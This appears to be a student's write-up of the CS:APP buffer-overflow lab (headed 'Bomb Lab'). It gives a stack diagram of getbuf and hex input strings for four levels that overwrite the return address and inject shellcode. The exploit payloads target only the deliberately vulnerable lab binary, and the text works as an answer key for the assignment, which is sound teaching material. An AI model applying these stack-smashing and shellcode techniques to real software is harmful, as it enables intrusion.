#######################################################
# CS:APP Bomb Lab
#######################################################

#gcc version
Target: x86_64-redhat-linux
Thread model: posix
gcc version 4.8.3 20140911 (Red Hat 4.8.3-9) (GCC) 

#######################################################
#gdb version
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-64.el7
This GDB was configured as "x86_64-redhat-linux-gnu".

#######################################################
#objdump version
GNU objdump version 2.23.52.0.1-30.el7 20130226

#######################################################

1.Ready for disassembly

Get the assembly code file by the command in terminal
objdump -d bomb > bomb64.s

Get strings of bomb
strings bomb > bomb.strings

Open binary file by hexedit
hexedit bomb 

#######################################################


#******************************************************
smoke:
#******************************************************

go to function getbuf at address 0x080491f4

stack organization for getbuf function:
           __________________
           |                |
           |                |
           |                |
           __________________
           | Return address |               4 bytes
           __________________
           |  Saved %ebp    | <--- %ebp     4 bytes
           __________________
           |  Saved %eax    |               4 bytes
           __________________
           |                |
           | 35  .......  0 | buf           36 bytes
           __________________
           |                |
           |                |
           |                |
           __________________

we can set the input string with 48 bytes to change the return address of function getbuf
set the last 4 bytes with the address of function smoke(0x08048c18)
the other bytes can be whatever you like

int a little endian machine, solution can be 
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 18 8c 04 08

#******************************************************
fizz:
#******************************************************

solution for fizz is too simple

similar to smoke, set the return addrees of function of getbuf to the address of function fizz
the difference is fizz take a argument, and the argument must be equal to cookie

go to function fizz at address 0x08048c42, we can see the argument stored at address next 8 bytes of %esp
the cookie is generate by makecookie with you name

my cookie is 0x386a9f7f, so the solution is:
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 42 8c 04 08 * * * * 7f 9f 6a 38 

#******************************************************
bang:
#******************************************************

go to function bang at address 0x08048c9d
with the instruct at address 0x08048ca3, 0x08048ca8 and function fizz,
we can determine the globla_value at address 0x804d100, and cookie at 0x804d108

to set the global_value in yourself instructs, we generate the byte codes like the eample in buflab32.pdf

first, touch a bang.s file in assemble(see the bang.s in folder buflab)
then compile it to an object file by command "gcc -m32 -c bang.s"
to get the instruction in hex digit, we disassemble bang.s with command "objdump -d bang.o > bang.d"

the genareted byte codes now in file bang.d

now, it's necessary to let the getbuf ret to an address which points to the genareted byte codes by last step
so the instruct will execute in your way

this time, we set the return address point to the start address of input string, not a specifc function
the start address of input string is %ebp-0x28(40), we can get it in gdb, 0x556835b8

and store the genareted byte codes in the stack address 0, to 35
the stack organization is above in smoke

the solution is:
a1 08 d1 04 08
a3 00 d1 04 08
68 9d 8c 04 08
c3
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 b8 35 68 55

#******************************************************
level3: Dynamite
#******************************************************

for this level, we should set the return address back to the caller of getbuf, like getbuf run in correct way,
but the return value should be set as your cookie

debug with gdb, we can get address of the return value, and the ret address in correct way

return value in address: 0x556835b8, correct return address is 0x08048dbe

like the solution for bang, we make some instructions to set the return value, and the return address,
but, at this time, we should note that the instruct return to the original caller,
so the stack pointer %ebp must be correctly restored, or it may cause segment fault

the solution is:
a1 08 d1 04 08
a3 b8 35 68 55
68 be 8d 04 08
c3
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30
10 36 68 55     /* restore %ebp */
b8 35 68 55

